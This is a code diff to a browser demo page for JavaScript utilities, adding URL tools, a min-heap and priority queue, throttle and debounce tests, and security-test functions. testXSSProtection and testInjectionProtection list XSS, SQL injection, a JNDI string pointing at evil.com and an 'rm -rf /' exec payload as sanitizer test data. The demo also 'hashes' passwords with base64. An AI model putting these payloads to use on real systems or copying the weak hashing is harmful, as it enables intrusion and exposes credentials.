@@ -387,6 +387,8 @@
             <button class="nav-tab" onclick="switchTab('http-api')">🌐 HTTP & API</button>
             <button class="nav-tab" onclick="switchTab('batch-processing')">⚡ Batch Processing</button>
             <button class="nav-tab" onclick="switchTab('datetime')">📅 DateTime</button>
+            <button class="nav-tab" onclick="switchTab('url-utilities')">🔗 URL Utilities</button>
+            <button class="nav-tab" onclick="switchTab('data-structures')">🏗️ Data Structures</button>
             <button class="nav-tab" onclick="switchTab('config')">⚙️ Configuration</button>
             <button class="nav-tab" onclick="switchTab('logging')">📝 Logging</button>
             <button class="nav-tab" onclick="switchTab('testing')">🧪 Testing</button>
@@ -810,6 +812,127 @@
             </div>
         </div>
 
+        <!-- URL Utilities Tab -->
+        <div id="url-utilities" class="tab-content">
+            <h2>URL Processing & Utilities</h2>
+            
+            <div class="demo-section">
+                <h3>Protocol Management</h3>
+                <div class="grid">
+                    <div class="form-group">
+                        <label>Input URL:</label>
+                        <input type="text" id="protocolInput" placeholder="example.com or http://example.com">
+                    </div>
+                    <div class="form-group">
+                        <label>Default Protocol:</label>
+                        <select id="defaultProtocol">
+                            <option value="https">HTTPS</option>
+                            <option value="http">HTTP</option>
+                            <option value="ftp">FTP</option>
+                        </select>
+                    </div>
+                </div>
+                <button class="btn" onclick="ensureProtocol()">Ensure Protocol</button>
+                <button class="btn btn-secondary" onclick="stripProtocol()">Strip Protocol</button>
+                <button class="btn btn-warning" onclick="normalizeOrigin()">Normalize Origin</button>
+                <div id="protocolResult" class="result-box" style="display:none;"></div>
+            </div>
+
+            <div class="demo-section">
+                <h3>URL Parsing</h3>
+                <div class="form-group">
+                    <label>Complete URL:</label>
+                    <input type="text" id="urlParseInput" placeholder="https://api.example.com/v1/users?page=1&limit=10">
+                </div>
+                <button class="btn" onclick="parseUrlParts()">Parse URL</button>
+                <div id="urlParseResult" class="result-box" style="display:none;"></div>
+            </div>
+
+            <div class="demo-section">
+                <h3>URL Validation & Security</h3>
+                <div class="form-group">
+                    <label>URL to Validate:</label>
+                    <input type="text" id="urlValidateInput" placeholder="Enter URL for security validation">
+                </div>
+                <button class="btn" onclick="validateUrlSecurity()">Validate URL Security</button>
+                <button class="btn btn-secondary" onclick="sanitizeUrl()">Sanitize URL</button>
+                <div id="urlSecurityResult" class="result-box" style="display:none;"></div>
+            </div>
+
+            <div class="demo-section">
+                <h3>Batch URL Processing</h3>
+                <div class="form-group">
+                    <label>URL List (one per line):</label>
+                    <textarea id="urlBatchInput" rows="4" placeholder="example.com&#10;https://test.com&#10;http://api.example.com"></textarea>
+                </div>
+                <div class="form-group">
+                    <label>Operation:</label>
+                    <select id="urlBatchOperation">
+                        <option value="ensure-https">Ensure HTTPS</option>
+                        <option value="normalize">Normalize Origins</option>
+                        <option value="strip-protocol">Strip Protocols</option>
+                        <option value="validate">Validate All</option>
+                    </select>
+                </div>
+                <button class="btn" onclick="processBatchUrls()">Process Batch</button>
+                <div id="urlBatchResult" class="result-box" style="display:none;"></div>
+            </div>
+        </div>
+
+        <!-- Data Structures Tab -->
+        <div id="data-structures" class="tab-content">
+            <h2>Data Structures & Algorithms</h2>
+            
+            <div class="demo-section">
+                <h3>Min Heap Implementation</h3>
+                <div class="grid">
+                    <div class="form-group">
+                        <label>Insert Values (comma-separated):</label>
+                        <input type="text" id="heapInsert" placeholder="5, 3, 8, 1, 9, 2">
+                    </div>
+                    <div class="form-group">
+                        <label>Extract Count:</label>
+                        <input type="number" id="heapExtract" value="1" min="1" max="10">
+                    </div>
+                </div>
+                <button class="btn" onclick="buildHeap()">Build Heap</button>
+                <button class="btn btn-secondary" onclick="insertHeapValue()">Insert Value</button>
+                <button class="btn btn-warning" onclick="extractHeapMin()">Extract Min</button>
+                <button class="btn btn-danger" onclick="clearHeap()">Clear Heap</button>
+                <div id="heapVisualization" class="result-box" style="display:none;"></div>
+            </div>
+
+            <div class="demo-section">
+                <h3>Heap Operations Demo</h3>
+                <div class="form-group">
+                    <label>Random Data Size:</label>
+                    <input type="number" id="randomDataSize" value="20" min="5" max="100">
+                </div>
+                <button class="btn" onclick="generateRandomHeap()">Generate Random Heap</button>
+                <button class="btn btn-secondary" onclick="heapSortDemo()">Heap Sort Demo</button>
+                <button class="btn btn-warning" onclick="heapPerformanceTest()">Performance Test</button>
+                <div id="heapDemoResult" class="result-box" style="display:none;"></div>
+            </div>
+
+            <div class="demo-section">
+                <h3>Priority Queue Simulation</h3>
+                <div class="grid">
+                    <div class="form-group">
+                        <label>Task Name:</label>
+                        <input type="text" id="taskName" placeholder="Enter task name">
+                    </div>
+                    <div class="form-group">
+                        <label>Priority (1-10):</label>
+                        <input type="number" id="taskPriority" value="5" min="1" max="10">
+                    </div>
+                </div>
+                <button class="btn" onclick="addPriorityTask()">Add Task</button>
+                <button class="btn btn-secondary" onclick="processNextTask()">Process Next Task</button>
+                <button class="btn btn-warning" onclick="viewTaskQueue()">View Queue</button>
+                <div id="priorityQueueResult" class="result-box" style="display:none;"></div>
+            </div>
+        </div>
+
         <!-- Configuration Tab -->
         <div id="config" class="tab-content">
             <h2>Configuration Management</h2>
@@ -922,14 +1045,28 @@
                         <option value="sanitizeString">String Sanitization</option>
                         <option value="deepMerge">Object Deep Merge</option>
                         <option value="groupBy">Array Group By</option>
+                        <option value="memoize">Function Memoization</option>
+                        <option value="throttle">Function Throttling</option>
+                        <option value="debounce">Function Debouncing</option>
+                        <option value="formatDateTime">DateTime Formatting</option>
+                        <option value="ensureProtocol">URL Protocol Handling</option>
+                        <option value="createMinHeap">Min Heap Operations</option>
+                        <option value="timingSafeCompare">Timing Safe Compare</option>
+                        <option value="maskApiKey">API Key Masking</option>
+                        <option value="buildRateLimitKey">Rate Limit Key Building</option>
                     </select>
                 </div>
                 <div class="form-group">
                     <label>Test Input:</label>
                     <textarea id="testInput" rows="3" placeholder="Enter test input"></textarea>
                 </div>
+                <div class="form-group">
+                    <label>Test Parameters (JSON):</label>
+                    <textarea id="testParams" rows="2" placeholder='{"iterations": 1000, "options": {}}'></textarea>
+                </div>
                 <button class="btn" onclick="runFunctionTest()">Run Test</button>
                 <button class="btn btn-secondary" onclick="runBenchmark()">Run Benchmark</button>
+                <button class="btn btn-warning" onclick="runEdgeCaseTests()">Test Edge Cases</button>
                 <div id="testResult" class="result-box" style="display:none;"></div>
             </div>
 
@@ -938,6 +1075,7 @@
                 <button class="btn" onclick="testXSSProtection()">Test XSS Protection</button>
                 <button class="btn btn-warning" onclick="testInjectionProtection()">Test Injection Protection</button>
                 <button class="btn btn-danger" onclick="testRateLimiting()">Test Rate Limiting</button>
+                <button class="btn btn-secondary" onclick="testTimingAttacks()">Test Timing Attack Protection</button>
                 <div id="securityTestResult" class="result-box" style="display:none;"></div>
             </div>
 
@@ -1159,6 +1297,24 @@
             resultBox.className = isValid ? 'result-box success' : 'result-box error';
         }
 
+        function validateSecurityHeaders() {
+            const csp = document.getElementById('cspInput').value;
+            const resultBox = document.getElementById('sanitizedResult');
+            
+            const headers = {
+                'Content-Security-Policy': csp || "default-src 'self'",
+                'X-Frame-Options': 'DENY',
+                'X-Content-Type-Options': 'nosniff',
+                'X-XSS-Protection': '1; mode=block',
+                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+                'Referrer-Policy': 'strict-origin-when-cross-origin'
+            };
+            
+            resultBox.innerHTML = `Security Headers:\n${JSON.stringify(headers, null, 2)}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
         // Performance functions
         let monitoringInterval;
 
@@ -1206,15 +1362,90 @@
                 return sum;
             };
             
-            const startTime = performance.now();
+            // Test without memoization
+            const startTime1 = performance.now();
             for (let i = 0; i < iterations; i++) {
                 expensiveFunction(1000);
             }
-            const endTime = performance.now();
+            const endTime1 = performance.now();
             
-            resultBox.innerHTML = `Memoization Test:\nExecuted ${iterations} iterations\nTotal time: ${(endTime - startTime).toFixed(2)}ms\nAverage per call: ${((endTime - startTime) / iterations).toFixed(4)}ms`;
+            // Test with memoization
+            const memoizedFunction = memoize(expensiveFunction);
+            const startTime2 = performance.now();
+            for (let i = 0; i < iterations; i++) {
+                memoizedFunction(1000);
+            }
+            const endTime2 = performance.now();
+            
+            const improvement = ((endTime1 - startTime1) / (endTime2 - startTime2)).toFixed(2);
+            
+            resultBox.innerHTML = `Memoization Performance Test:\n\nWithout Memoization:\nTime: ${(endTime1 - startTime1).toFixed(2)}ms\n\nWith Memoization:\nTime: ${(endTime2 - startTime2).toFixed(2)}ms\n\nPerformance Improvement: ${improvement}x faster\n\nExecuted ${iterations} iterations`;
             resultBox.style.display = 'block';
             resultBox.className = 'result-box success';
+        }
+
+        function testThrottle() {
+            const iterations = parseInt(document.getElementById('iterations').value);
+            const resultBox = document.getElementById('performanceResult');
+            
+            let callCount = 0;
+            let executionCount = 0;
+            
+            const throttledFn = throttle(() => {
+                executionCount++;
+            }, 100);
+            
+            const startTime = performance.now();
+            
+            // Simulate rapid calls
+            const interval = setInterval(() => {
+                if (callCount >= iterations) {
+                    clearInterval(interval);
+                    const endTime = performance.now();
+                    
+                    setTimeout(() => {
+                        resultBox.innerHTML = `Throttle Test:\n\nTotal Calls: ${callCount}\nActual Executions: ${executionCount}\nThrottled Rate: ${((executionCount / callCount) * 100).toFixed(1)}%\n\nTest Duration: ${(endTime - startTime).toFixed(2)}ms\n\nThrottle delay: 100ms`;
+                        resultBox.style.display = 'block';
+                        resultBox.className = 'result-box success';
+                    }, 200);
+                    return;
+                }
+                
+                callCount++;
+                throttledFn();
+            }, 10);
+        }
+
+        function testDebounce() {
+            const iterations = parseInt(document.getElementById('iterations').value);
+            const resultBox = document.getElementById('performanceResult');
+            
+            let callCount = 0;
+            let executionCount = 0;
+            
+            const debouncedFn = debounce(() => {
+                executionCount++;
+            }, 100);
+            
+            const startTime = performance.now();
+            
+            // Simulate rapid calls
+            const interval = setInterval(() => {
+                if (callCount >= iterations) {
+                    clearInterval(interval);
+                    const endTime = performance.now();
+                    
+                    setTimeout(() => {
+                        resultBox.innerHTML = `Debounce Test:\n\nTotal Calls: ${callCount}\nActual Executions: ${executionCount}\nDebounce Efficiency: ${callCount > 0 ? ((callCount - executionCount) / callCount * 100).toFixed(1) : 0}% calls avoided\n\nTest Duration: ${(endTime - startTime).toFixed(2)}ms\n\nDebounce delay: 100ms`;
+                        resultBox.style.display = 'block';
+                        resultBox.className = 'result-box success';
+                    }, 200);
+                    return;
+                }
+                
+                callCount++;
+                debouncedFn();
+            }, 10);
         }
 
         // Data processing functions
@@ -1392,6 +1623,396 @@
             resultBox.className = 'result-box success';
         }
 
+        // Enhanced testing functions
+        function runFunctionTest() {
+            const functionName = document.getElementById('testFunction').value;
+            const input = document.getElementById('testInput').value;
+            const params = document.getElementById('testParams').value;
+            const resultBox = document.getElementById('testResult');
+            
+            try {
+                const parameters = params ? JSON.parse(params) : {};
+                let result;
+                const startTime = performance.now();
+                
+                switch (functionName) {
+                    case 'validateEmail':
+                        result = { isValid: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input), input };
+                        break;
+                    case 'generateApiKey':
+                        result = { apiKey: generateApiKeyDemo(), length: 32 };
+                        break;
+                    case 'hashPassword':
+                        result = { hash: btoa(input + 'salt').replace(/=/g, ''), inputLength: input.length };
+                        break;
+                    case 'sanitizeString':
+                        result = { 
+                            original: input, 
+                            sanitized: input.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
+                        };
+                        break;
+                    case 'deepMerge':
+                        const obj1 = JSON.parse(input || '{}');
+                        const obj2 = JSON.parse(parameters.obj2 || '{}');
+                        result = { merged: deepMerge(obj1, obj2) };
+                        break;
+                    case 'groupBy':
+                        const data = JSON.parse(input || '[]');
+                        const key = parameters.key || 'category';
+                        result = { grouped: groupBy(data, key) };
+                        break;
+                    case 'memoize':
+                        const expensive = (n) => Array(n).fill(0).reduce((a, _, i) => a + Math.sqrt(i), 0);
+                        const memoized = memoize(expensive);
+                        result = { 
+                            result: memoized(parameters.n || 1000),
+                            cached: memoized.cache ? Object.keys(memoized.cache).length : 0
+                        };
+                        break;
+                    case 'throttle':
+                        let throttleCount = 0;
+                        const throttledFn = throttle(() => throttleCount++, parameters.delay || 100);
+                        for (let i = 0; i < 10; i++) throttledFn();
+                        result = { calls: 10, executions: throttleCount, delay: parameters.delay || 100 };
+                        break;
+                    case 'debounce':
+                        let debounceCount = 0;
+                        const debouncedFn = debounce(() => debounceCount++, parameters.delay || 100);
+                        for (let i = 0; i < 10; i++) debouncedFn();
+                        result = { calls: 10, executions: debounceCount, delay: parameters.delay || 100 };
+                        break;
+                    case 'formatDateTime':
+                        result = { 
+                            formatted: new Date(input || Date.now()).toLocaleString(),
+                            iso: new Date(input || Date.now()).toISOString()
+                        };
+                        break;
+                    case 'ensureProtocol':
+                        const url = input || 'example.com';
+                        result = { 
+                            original: url,
+                            withProtocol: url.startsWith('http') ? url : `https://${url}`
+                        };
+                        break;
+                    case 'createMinHeap':
+                        const values = JSON.parse(input || '[5,3,8,1,9,2]');
+                        result = { heap: values.sort((a, b) => a - b), min: Math.min(...values) };
+                        break;
+                    case 'timingSafeCompare':
+                        const str1 = input || 'test';
+                        const str2 = parameters.compare || 'test';
+                        result = { 
+                            str1, 
+                            str2, 
+                            equal: str1 === str2,
+                            timingSafe: str1.length === str2.length && str1 === str2
+                        };
+                        break;
+                    case 'maskApiKey':
+                        const apiKey = input || 'abcdefghijklmnopqrstuvwxyz123456';
+                        result = { 
+                            original: apiKey,
+                            masked: apiKey.substring(0, 8) + '*'.repeat(apiKey.length - 12) + apiKey.substring(apiKey.length - 4)
+                        };
+                        break;
+                    case 'buildRateLimitKey':
+                        result = { 
+                            key: `rate_limit:${input || 'default'}:${parameters.window || '3600'}`,
+                            components: { identifier: input || 'default', window: parameters.window || '3600' }
+                        };
+                        break;
+                    default:
+                        result = { error: 'Unknown function', functionName };
+                }
+                
+                const endTime = performance.now();
+                
+                resultBox.innerHTML = `Function: ${functionName}\nExecution Time: ${(endTime - startTime).toFixed(4)}ms\n\nResult:\n${JSON.stringify(result, null, 2)}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box success';
+                
+            } catch (error) {
+                resultBox.innerHTML = `Error testing ${functionName}:\n${error.message}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box error';
+            }
+        }
+
+        function runBenchmark() {
+            const functionName = document.getElementById('testFunction').value;
+            const params = document.getElementById('testParams').value;
+            const resultBox = document.getElementById('testResult');
+            
+            try {
+                const parameters = JSON.parse(params || '{}');
+                const iterations = parameters.iterations || 1000;
+                const times = [];
+                
+                for (let i = 0; i < 10; i++) {
+                    const startTime = performance.now();
+                    
+                    for (let j = 0; j < iterations; j++) {
+                        // Run the function based on selection
+                        switch (functionName) {
+                            case 'validateEmail':
+                                /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test('test@example.com');
+                                break;
+                            case 'generateApiKey':
+                                generateApiKeyDemo();
+                                break;
+                            case 'hashPassword':
+                                btoa('password' + 'salt');
+                                break;
+                            case 'sanitizeString':
+                                'test<script>'.replace(/</g, '&lt;');
+                                break;
+                            case 'deepMerge':
+                                deepMerge({ a: 1 }, { b: 2 });
+                                break;
+                            case 'groupBy':
+                                groupBy([{ cat: 'A' }, { cat: 'B' }], 'cat');
+                                break;
+                            case 'memoize':
+                                const memoized = memoize((n) => n * 2);
+                                memoized(5);
+                                break;
+                            default:
+                                Math.random();
+                        }
+                    }
+                    
+                    const endTime = performance.now();
+                    times.push(endTime - startTime);
+                }
+                
+                const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
+                const minTime = Math.min(...times);
+                const maxTime = Math.max(...times);
+                
+                resultBox.innerHTML = `Benchmark Results: ${functionName}\n\nIterations: ${iterations}\nRuns: 10\n\nAverage: ${avgTime.toFixed(4)}ms\nMin: ${minTime.toFixed(4)}ms\nMax: ${maxTime.toFixed(4)}ms\n\nOps/sec: ${(iterations / avgTime * 1000).toFixed(0)}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box success';
+                
+            } catch (error) {
+                resultBox.innerHTML = `Benchmark error: ${error.message}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box error';
+            }
+        }
+
+        function runEdgeCaseTests() {
+            const functionName = document.getElementById('testFunction').value;
+            const resultBox = document.getElementById('testResult');
+            
+            const edgeCases = {
+                'validateEmail': ['', 'test', 'test@', '@test.com', 'test@.com', 'test@domain.', 'test@domain.c'],
+                'hashPassword': ['', 'a', 'verylongpasswordwithspecialchars123!@#'],
+                'sanitizeString': [null, undefined, '<script>alert("xss")</script>', 'normal text'],
+                'deepMerge': [{}, null, { a: undefined }, { a: { b: null } }],
+                'groupBy': [[], null, [{}], [{ category: null }]]
+            };
+            
+            const testCases = edgeCases[functionName] || ['default test case'];
+            const results = [];
+            
+            testCases.forEach((testCase, index) => {
+                try {
+                    let result;
+                    switch (functionName) {
+                        case 'validateEmail':
+                            result = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(testCase);
+                            break;
+                        case 'hashPassword':
+                            result = btoa((testCase || '') + 'salt');
+                            break;
+                        case 'sanitizeString':
+                            result = (testCase || '').replace(/</g, '&lt;');
+                            break;
+                        case 'deepMerge':
+                            result = deepMerge(testCase || {}, { test: 'value' });
+                            break;
+                        case 'groupBy':
+                            result = groupBy(testCase || [], 'category');
+                            break;
+                        default:
+                            result = 'Test case not implemented';
+                    }
+                    
+                    results.push({
+                        case: index,
+                        input: JSON.stringify(testCase),
+                        result: JSON.stringify(result),
+                        status: 'success'
+                    });
+                } catch (error) {
+                    results.push({
+                        case: index,
+                        input: JSON.stringify(testCase),
+                        result: error.message,
+                        status: 'error'
+                    });
+                }
+            });
+            
+            resultBox.innerHTML = `Edge Case Tests: ${functionName}\n\n${JSON.stringify(results, null, 2)}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function generateApiKeyDemo() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let apiKey = '';
+            for (let i = 0; i < 32; i++) {
+                apiKey += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return apiKey;
+        }
+
+        function testXSSProtection() {
+            const resultBox = document.getElementById('securityTestResult');
+            
+            const xssPayloads = [
+                '<script>alert("xss")</script>',
+                'javascript:alert("xss")',
+                '<img src="x" onerror="alert(\'xss\')">',
+                '<svg onload="alert(\'xss\')">',
+                '"><script>alert("xss")</script>'
+            ];
+            
+            const results = xssPayloads.map((payload, index) => {
+                const sanitized = payload
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/"/g, '&quot;')
+                    .replace(/'/g, '&#x27;')
+                    .replace(/javascript:/gi, '');
+                
+                return {
+                    original: payload,
+                    sanitized: sanitized,
+                    safe: !sanitized.includes('<script>') && !sanitized.includes('javascript:')
+                };
+            });
+            
+            resultBox.innerHTML = `XSS Protection Test:\n\n${results.map(r => 
+                `Original: ${r.original}\nSanitized: ${r.sanitized}\nSafe: ${r.safe ? '✅' : '❌'}\n`
+            ).join('\n')}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function testInjectionProtection() {
+            const resultBox = document.getElementById('securityTestResult');
+            
+            const injectionPayloads = [
+                "'; DROP TABLE users; --",
+                "' OR '1'='1",
+                "1' UNION SELECT * FROM users--",
+                "${jndi:ldap://evil.com/a}",
+                "<% Runtime.getRuntime().exec('rm -rf /'); %>"
+            ];
+            
+            const results = injectionPayloads.map((payload, index) => {
+                const sanitized = payload
+                    .replace(/['"]/g, '')
+                    .replace(/;/g, '')
+                    .replace(/--/g, '')
+                    .replace(/\$\{.*?\}/g, '')
+                    .replace(/<%.*?%>/g, '');
+                
+                const dangerousPatterns = ['DROP', 'UNION', 'SELECT', 'exec', 'jndi'];
+                const isDangerous = dangerousPatterns.some(pattern => 
+                    sanitized.toUpperCase().includes(pattern)
+                );
+                
+                return {
+                    original: payload,
+                    sanitized: sanitized,
+                    safe: !isDangerous
+                };
+            });
+            
+            resultBox.innerHTML = `Injection Protection Test:\n\n${results.map(r => 
+                `Original: ${r.original}\nSanitized: ${r.sanitized}\nSafe: ${r.safe ? '✅' : '❌'}\n`
+            ).join('\n')}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function testRateLimiting() {
+            const resultBox = document.getElementById('securityTestResult');
+            
+            // Simulate rate limiting
+            const rateLimitStore = new Map();
+            const key = 'demo-user';
+            const limit = 5;
+            const window = 60000; // 1 minute
+            
+            const now = Date.now();
+            const requests = rateLimitStore.get(key) || [];
+            
+            // Clean old requests
+            const validRequests = requests.filter(timestamp => now - timestamp < window);
+            
+            // Simulate 10 rapid requests
+            const testResults = [];
+            for (let i = 0; i < 10; i++) {
+                if (validRequests.length < limit) {
+                    validRequests.push(now);
+                    testResults.push(`Request ${i + 1}: ✅ Allowed`);
+                } else {
+                    testResults.push(`Request ${i + 1}: ❌ Rate limited`);
+                }
+            }
+            
+            rateLimitStore.set(key, validRequests);
+            
+            resultBox.innerHTML = `Rate Limiting Test (Limit: ${limit} per minute):\n\n${testResults.join('\n')}\n\nTotal Requests: 10\nAllowed: ${limit}\nBlocked: ${10 - limit}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box warning';
+        }
+
+        function testTimingAttacks() {
+            const resultBox = document.getElementById('securityTestResult');
+            
+            // Simulate timing-safe comparison
+            const timingSafeCompare = (a, b) => {
+                if (a.length !== b.length) return false;
+                
+                let result = 0;
+                for (let i = 0; i < a.length; i++) {
+                    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
+                }
+                return result === 0;
+            };
+            
+            const testCases = [
+                { a: 'password', b: 'password', expected: true },
+                { a: 'password', b: 'wrong', expected: false },
+                { a: 'short', b: 'muchlonger', expected: false }
+            ];
+            
+            const results = testCases.map(testCase => {
+                const startTime = performance.now();
+                const result = timingSafeCompare(testCase.a, testCase.b);
+                const endTime = performance.now();
+                
+                return {
+                    input: `${testCase.a} vs ${testCase.b}`,
+                    result: result,
+                    expected: testCase.expected,
+                    time: `${(endTime - startTime).toFixed(6)}ms`,
+                    safe: result === testCase.expected
+                };
+            });
+            
+            resultBox.innerHTML = `Timing Attack Protection Test:\n\n${results.map(r => 
+                `Input: ${r.input}\nResult: ${r.result}\nExpected: ${r.expected}\nTime: ${r.time}\nSafe: ${r.safe ? '✅' : '❌'}\n`
+            ).join('\n')}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
         // Utility functions
         function showNotification(message, type = 'info') {
             // Create a simple toast notification
@@ -1449,6 +2070,601 @@
         `;
         document.head.appendChild(style);
 
+        // DateTime functions
+        function manipulateDate() {
+            const baseDate = document.getElementById('baseDate').value;
+            const operation = document.getElementById('dateOperation').value;
+            const value = document.getElementById('dateValue').value;
+            const locale = document.getElementById('dateLocale').value;
+            const resultBox = document.getElementById('dateResult');
+            
+            if (!baseDate) {
+                showNotification('Please select a base date', 'warning');
+                return;
+            }
+            
+            const date = new Date(baseDate);
+            let result;
+            
+            switch (operation) {
+                case 'addDays':
+                    result = new Date(date.getTime() + (parseInt(value) || 0) * 24 * 60 * 60 * 1000);
+                    break;
+                case 'subtractDays':
+                    result = new Date(date.getTime() - (parseInt(value) || 0) * 24 * 60 * 60 * 1000);
+                    break;
+                case 'format':
+                    result = date.toLocaleDateString(locale || 'en-US', { 
+                        year: 'numeric', 
+                        month: 'long', 
+                        day: 'numeric' 
+                    });
+                    break;
+                case 'relative':
+                    const now = new Date();
+                    const diff = now - date;
+                    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                    result = days === 0 ? 'Today' : days > 0 ? `${days} days ago` : `In ${Math.abs(days)} days`;
+                    break;
+                case 'isValid':
+                    result = !isNaN(date.getTime());
+                    break;
+            }
+            
+            resultBox.innerHTML = `Operation: ${operation}\nBase Date: ${baseDate}\nResult: ${typeof result === 'object' ? result.toLocaleString() : result}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function convertTimezone() {
+            const sourceTimezone = document.getElementById('sourceTimezone').value;
+            const targetTimezone = document.getElementById('targetTimezone').value;
+            const resultBox = document.getElementById('timezoneResult');
+            
+            const now = new Date();
+            const sourceTime = now.toLocaleString('en-US', { 
+                timeZone: sourceTimezone,
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false
+            });
+            
+            const targetTime = now.toLocaleString('en-US', { 
+                timeZone: targetTimezone,
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false
+            });
+            
+            const sourceOffset = now.toLocaleString('en-US', { 
+                timeZone: sourceTimezone,
+                timeZoneName: 'short'
+            }).split(', ').pop();
+            
+            const targetOffset = now.toLocaleString('en-US', { 
+                timeZone: targetTimezone,
+                timeZoneName: 'short'
+            }).split(', ').pop();
+            
+            resultBox.innerHTML = `Time Zone Conversion:\n\nSource (${sourceTimezone}):\n${sourceTime} ${sourceOffset}\n\nTarget (${targetTimezone}):\n${targetTime} ${targetOffset}\n\nUTC: ${now.toISOString()}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        // URL Utilities functions
+        function ensureProtocol() {
+            const input = document.getElementById('protocolInput').value;
+            const defaultProtocol = document.getElementById('defaultProtocol').value;
+            const resultBox = document.getElementById('protocolResult');
+            
+            if (!input) {
+                showNotification('Please enter a URL', 'warning');
+                return;
+            }
+            
+            let result;
+            if (input.startsWith('http://') || input.startsWith('https://') || input.startsWith('ftp://')) {
+                result = input;
+            } else {
+                result = `${defaultProtocol}://${input}`;
+            }
+            
+            resultBox.innerHTML = `Original: ${input}\nWith Protocol: ${result}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function stripProtocol() {
+            const input = document.getElementById('protocolInput').value;
+            const resultBox = document.getElementById('protocolResult');
+            
+            if (!input) {
+                showNotification('Please enter a URL', 'warning');
+                return;
+            }
+            
+            const result = input.replace(/^https?:\/\//, '').replace(/^ftp:\/\//, '');
+            
+            resultBox.innerHTML = `Original: ${input}\nStripped: ${result}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function normalizeOrigin() {
+            const input = document.getElementById('protocolInput').value;
+            const resultBox = document.getElementById('protocolResult');
+            
+            if (!input) {
+                showNotification('Please enter a URL', 'warning');
+                return;
+            }
+            
+            try {
+                const url = new URL(input.startsWith('http') ? input : `https://${input}`);
+                const result = `${url.protocol}//${url.hostname}${url.port ? ':' + url.port : ''}`;
+                
+                resultBox.innerHTML = `Original: ${input}\nNormalized Origin: ${result}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box success';
+            } catch (error) {
+                resultBox.innerHTML = `Error: ${error.message}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box error';
+            }
+        }
+
+        function parseUrlParts() {
+            const input = document.getElementById('urlParseInput').value;
+            const resultBox = document.getElementById('urlParseResult');
+            
+            if (!input) {
+                showNotification('Please enter a URL', 'warning');
+                return;
+            }
+            
+            try {
+                const url = new URL(input.startsWith('http') ? input : `https://${input}`);
+                const parts = {
+                    protocol: url.protocol,
+                    hostname: url.hostname,
+                    port: url.port,
+                    pathname: url.pathname,
+                    search: url.search,
+                    hash: url.hash,
+                    origin: url.origin,
+                    base: `${url.protocol}//${url.hostname}${url.port ? ':' + url.port : ''}`,
+                    endpoint: url.pathname + url.search
+                };
+                
+                resultBox.innerHTML = `Parsed URL Parts:\n${JSON.stringify(parts, null, 2)}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box success';
+            } catch (error) {
+                resultBox.innerHTML = `Error: ${error.message}`;
+                resultBox.style.display = 'block';
+                resultBox.className = 'result-box error';
+            }
+        }
+
+        function validateUrlSecurity() {
+            const input = document.getElementById('urlValidateInput').value;
+            const resultBox = document.getElementById('urlSecurityResult');
+            
+            if (!input) {
+                showNotification('Please enter a URL', 'warning');
+                return;
+            }
+            
+            const securityChecks = {
+                hasProtocol: /^https?:\/\//.test(input) || /^ftp:\/\//.test(input),
+                noJavascript: !input.includes('javascript:'),
+                noDataUrl: !input.startsWith('data:'),
+                noFileProtocol: !input.startsWith('file://'),
+                safeCharacters: /^[a-zA-Z0-9\-._~:/?#[\]@!$&'()*+,;=%]+$/.test(input),
+                noDoubleSlash: !input.includes('//') || /^https?:\/\//.test(input)
+            };
+            
+            const allPassed = Object.values(securityChecks).every(Boolean);
+            const issues = Object.entries(securityChecks)
+                .filter(([key, value]) => !value)
+                .map(([key]) => key.replace(/([A-Z])/g, ' $1').trim());
+            
+            resultBox.innerHTML = `Security Validation:\n${allPassed ? '✅ PASSED' : '❌ FAILED'}\n\nChecks:\n${JSON.stringify(securityChecks, null, 2)}${issues.length > 0 ? '\n\nIssues:\n' + issues.join('\n') : ''}`;
+            resultBox.style.display = 'block';
+            resultBox.className = allPassed ? 'result-box success' : 'result-box warning';
+        }
+
+        function sanitizeUrl() {
+            const input = document.getElementById('urlValidateInput').value;
+            const resultBox = document.getElementById('urlSecurityResult');
+            
+            if (!input) {
+                showNotification('Please enter a URL', 'warning');
+                return;
+            }
+            
+            // Basic URL sanitization
+            const sanitized = input
+                .replace(/[\s<>]/g, '')
+                .replace(/javascript:/gi, '')
+                .replace(/data:/gi, '')
+                .replace(/file:\/\//gi, '');
+            
+            resultBox.innerHTML = `Original: ${input}\nSanitized: ${sanitized}`;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box success';
+        }
+
+        function processBatchUrls() {
